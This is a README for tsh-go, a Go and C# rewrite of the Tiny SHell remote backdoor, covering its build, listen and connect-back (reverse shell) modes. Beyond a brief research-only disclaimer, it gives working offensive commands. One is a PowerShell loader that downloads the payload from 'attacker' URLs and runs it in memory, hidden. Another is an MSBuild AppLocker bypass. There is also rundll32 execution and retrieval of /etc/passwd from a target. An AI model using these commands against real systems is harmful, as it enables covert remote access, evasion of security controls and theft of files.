# tsh-go

This is [Tiny SHell](https://github.com/creaktive/tsh) rewritten in Go programming language.

## Disclaimer

This program is only for helping research or educational purpose,

**DON'T** use for illegal purpose or in any unauthorized environment.

## Description

I like tsh and I use it a lot in my daily research work. It's especially handy when researching devices that don't have built-in sshd or are network limited.

However, sometimes these devices use special systems or architectures that can make cross-compiling tsh painful. So I decided to rewrite tsh in go, and thanks to go's powerful cross-platform compilation capabilities, I can use tsh more easily on more systems and architectures.

For example, I successfully compiled to the following platforms:
- aix
- darwin
- dragonfly
- freebsd
- illumos
- netbsd
- openbsd
- solaris
- windows

## Usage

### Compiling

#### Help
```
$ make

Please specify one of these targets:
        make linux
        make windows

It can be compiled to other unix-like platforms supported by go compiler:
        GOOS=freebsd GOARCH=386 make unix

Get more with:
        go tool dist list
```

#### Build for linux

```
$ make linux
env GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o ./build/tshd_linux_amd64 cmd/tshd.go
env GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o ./build/tsh_linux_amd64 cmd/tsh.go
```

#### Build for windows

```
$ make windows
env GOOS=windows GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o ./build/tshd_windows_amd64.exe cmd/tshd.go
env GOOS=windows GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o ./build/tsh_windows_amd64.exe cmd/tsh.go
```

#### Build for windows (DLL)

```
$ make windows_dll
env CGO_ENABLED=1 GOOS=windows GOARCH=amd64 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags "-s -w -H=windowsgui" -o ./build/tshd.dll cmd/tshd_dll.go
```

#### Build for C# (Mono)

```
$ mcs -out:build/tshd.exe cmd/tshd.cs
```

### How to use the tshd (server)

#### Help

```
$ ./build/tshd_linux_amd64 -h
Usage of tshd_linux_amd64:
  -c string
        connect back host
  -d int
        connect back delay (default 5)
  -daemon
        (internal used) is in daemon
  -p int
        port (default 1234)
  -s string
        secret (default "1234")
```

#### Listening on target

```
$ ./build/tshd_linux_amd64
```

#### Connect back mode

```
$ ./build/tshd_linux_amd64 -c <client hostname>
```

#### Run via rundll32 (Windows DLL)

```
rundll32.exe tshd.dll,Run -c <client hostname> -p 2345 -s mysecret -d 10
```

#### Run C# version

```
# Listen mode
$ mono build/tshd.exe -p 1234 -s mysecret

# Connect back mode
$ mono build/tshd.exe -c <client hostname> -p 2345 -s mysecret -d 10
```

#### Run C# version via PowerShell (Fileless/Memory Load)

You can load the compiled `tshd.exe` into memory and execute it using PowerShell:

```powershell
# Load bytes
$bytes = [System.IO.File]::ReadAllBytes("tshd.exe")
# Or download: $bytes = (New-Object System.Net.WebClient).DownloadData("http://attacker/tshd.exe")

# Load assembly
$assembly = [System.Reflection.Assembly]::Load($bytes)

# Invoke Main
$entryPoint = $assembly.EntryPoint
# Arguments: -c <host> -p <port> -s <secret>
$args = [string[]] @("-c", "192.168.1.100", "-p", "1234", "-s", "1234")
$entryPoint.Invoke($null, [object[]] @(,$args))
```

#### Run in background (PowerShell)

To run in the background without blocking the shell (using a Job):

```powershell
$bytes = [System.IO.File]::ReadAllBytes("tshd.exe")
# Arguments: -c <host> -p <port> -s <secret>
$tshdArgs = [string[]] @("-c", "192.168.1.100", "-p", "1234", "-s", "1234")

Start-Job -ScriptBlock {
    param($bytes, $args)
    # Load assembly in the job process
    $assembly = [System.Reflection.Assembly]::Load($bytes)
    # Invoke Main
    $assembly.EntryPoint.Invoke($null, [object[]] @(,$args))
} -ArgumentList $bytes, $tshdArgs
```

#### Generate PowerShell Loader Script

You can use the `tshd-ps.py` helper script to generate a PowerShell one-liner that downloads (or reads) and executes `tshd.exe` in memory, in a hidden background process.

Usage:

```bash
python3 tshd-ps.py -c <host> -p <port> -s <secret> -pe <url_or_path_to_exe>
```

Example:

```bash
python3 tshd-ps.py -c 192.168.1.100 -p 1234 -s mysecret -pe http://attacker.com/tshd.exe
```

This will output a PowerShell command that you can run on the target machine. It handles downloading the executable into memory and running it without touching the disk.


#### Execute using MSBuild (Fileless / AppLocker Bypass)

You can run the C# version "filelessly" by embedding it into an MSBuild XML project file. This compiles and executes the C# code in memory using the trusted `MSBuild.exe` binary.

1. Generate the loader XML:

```bash
python3 tshd-msbuild.py -c 192.168.1.100 -p 1234 -s mysecret -o build/tshd_loader.xml
```

2. Run on the target machine (requires .NET Framework 4.0+):

```cmd
cmd /c start C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe c:\tshd_loader.xml
```


### How to use the tsh (client)

#### Help

```
$ ./build/tsh_linux_amd64 -h
Usage: ./tsh_linux_amd64 [-s secret] [-p port] <action>
  action:
        <hostname|cb> [command]
        <hostname|cb> get <source-file> <dest-dir>
        <hostname|cb> put <source-file> <dest-dir>
  -p int
        port (default 1234)
  -s string
        secret (default "1234")
```

#### Start a shell

```
$ ./build/tsh_linux_amd64 <server hostname>
```

#### Execute a command

```
$ ./build/tsh_linux_amd64 <server hostname> 'uname -a'
```

#### Transfer files

```
$ ./build/tsh_linux_amd64 <server hostname> get /etc/passwd .
$ ./build/tsh_linux_amd64 <server hostname> put myfile /tmp
```

#### Connect back mode

```
$ ./build/tsh_linux_amd64 cb
$ ./build/tsh_linux_amd64 cb get /etc/passwd .
$ ./build/tsh_linux_amd64 cb put myfile /tmp
```
